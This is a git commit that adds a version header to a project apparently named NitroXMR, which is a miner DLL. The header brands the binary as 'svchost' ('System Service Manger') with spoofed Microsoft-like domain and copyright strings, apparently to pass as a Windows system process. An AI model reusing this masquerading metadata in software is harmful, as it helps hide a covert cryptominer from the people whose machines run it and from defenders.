2312f38cc509ef97801ecee53bc792371d1543ff
林海 陈 <quartz010@outlook.com>
2017-10-31 14:04:25 +0800

    加入版本信息

---
+++ NitroXMR/src/MinerDll/version.h
@@ -0,0 +1,17 @@
+#pragma once
+
+#define APP_ID        "svchost"
+#define APP_NAME      "svchost"
+#define APP_DESC      "System Service Manger"
+#define APP_VERSION   "v1.1 Alpha"
+#define APP_DOMAIN    "MICR0$0FT.com"
+#define APP_SITE      "www.MICR0$0FT.com"
+#define APP_COPYRIGHT "Copyright (C) 2016-2017 M$"
+
+#define APP_VER_MAJOR  1
+#define APP_VER_MINOR  1
+#define APP_VER_BUILD  1
+#define APP_VER_REV    0
+
+
+#define MSVC_VERSION 0
